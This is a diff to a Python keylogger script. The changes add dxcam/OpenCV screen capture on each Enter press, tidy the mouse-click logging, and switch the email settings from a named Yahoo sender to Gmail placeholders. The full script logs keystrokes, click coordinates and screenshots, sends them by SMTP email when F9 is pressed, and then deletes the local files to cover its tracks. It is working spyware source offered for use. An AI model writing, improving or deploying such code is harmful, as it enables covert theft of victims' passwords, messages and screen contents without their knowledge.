@@ -2,9 +2,9 @@
 # 22 February 2024
 
 # Site-packages
+import cv2, dxcam
 from pynput.keyboard import Listener as Keyboard_listener, Key
 from pynput.mouse import Listener as Mouse_listener, Button
-from pyautogui import screenshot
 
 # stdlibs
 from datetime import datetime
@@ -27,8 +27,10 @@ def get_time(day=False) -> str:
 
 def get_screenshot() -> None:
   idx = len(listdir("./s_manifest"))
-  ss = screenshot()
-  ss.save(f"./s_manifest/ss_{idx}.jpg")
+  img = cam.grab()
+  img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
+  cv2.imwrite(f"./s_manifest/s{idx}.jpg", img)
+  log_f.write(f"「s{idx}」 ")
 
 
 def keyboard_press(key: Key) -> None:
@@ -55,15 +57,15 @@ def keyboard_press(key: Key) -> None:
 
     # Press F9 -> send mail AND terminate
     if key == Key.f9:
-      log_f.write(f"\n\n「Keylogger terminated {get_time(day=True)}」")
+      log_f.write(f"\n\n「Keylogger terminated {get_time(day=True)}」 ")
       exit_ = True
       send_mail()
       return False
 
     # Enter -> create new line in log file + get time
     elif key == Key.enter:
+      key = f"\n「••   {get_time(day=True)}」"
       get_screenshot()
-      key = f"\n「••   {get_time(day=True)}」 "
 
     # For aesthetic
     elif key == Key.backspace:
@@ -84,30 +86,30 @@ def keyboard_press(key: Key) -> None:
   log_f.write(key)
 
 
-def mouse_click(x, y, button, pressed) -> None:
+def mouse_click(x, y, button, pressed) -> bool | None:
   """
   on_click for mouse listener.
   """
   if exit_:
     return False
-  if pressed:
-    if button == Button.left:
-      button = 'L'
-    elif button == Button.right:
-      button = 'R'
-    else:
-      button = 'M'
-
-    # :>4d: Right aligned text with width=4
-    log_f.write(f"\n「{x :>4d} {y :>4d} {button} {get_time()}」 ")
+  if not pressed:
+    return None
+  if button == Button.left:
+    button = 'L'
+  elif button == Button.right:
+    button = 'R'
+  else:
+    button = 'M'
+  # :>4d: Right aligned text with width=4
+  log_f.write(f"\n「{x :>4d} {y :>4d} {button} {get_time()}」 ")
 
 
 def send_mail() -> None:
   """
-  Send keylogger data through Gmail.
+  Send keylogger data through SMTP.
   """
   try:
-    print("Initialize and login gmail server")
+    print("Initializing and logging in SMTP server")
     server = SMTP(host=SMTP_HOST, port=SMTP_PORT)
     server.ehlo()
     server.starttls(context=create_default_context())
@@ -141,7 +143,7 @@ def send_mail() -> None:
     server.quit()
     print("Email sent successfully")
 
-    # Delete everything that have just been sent
+    print("Deleting everything in disk that have just been sent")
     log_f.close()
     rmtree("./s_manifest", ignore_errors=True)
 
@@ -159,15 +161,16 @@ if __name__ == "__main__":
   except FileExistsError:
     pass
   exit_ = False
+  cam = dxcam.create()
   log_f = open("./s_manifest/log.txt", mode="a+", encoding="utf-8")
   log_f.write(f"\n\n「Keylogger started {get_time(day=True)}」\n")
 
-  # Edit this before using
-  SMTP_HOST = "smtp.mail.yahoo.com"
+  # TODO: Edit this before using
+  SMTP_HOST = "smtp.gmail.com"
   SMTP_PORT = 587
-  SENDER = "brfox2k6@yahoo.com"
-  SMTP_PASSWORD = ""
-  RECIPIENT = "brfox2k6@gmail.com"
+  SENDER = "your_email@gmail.com"
+  SMTP_PASSWORD = "abcdefghijklmnop"  # 16 lowercase letters
+  RECIPIENT = "recipient@gmail.com"
 
   # Create threads
   keyboard = Keyboard_listener(on_press=keyboard_press)
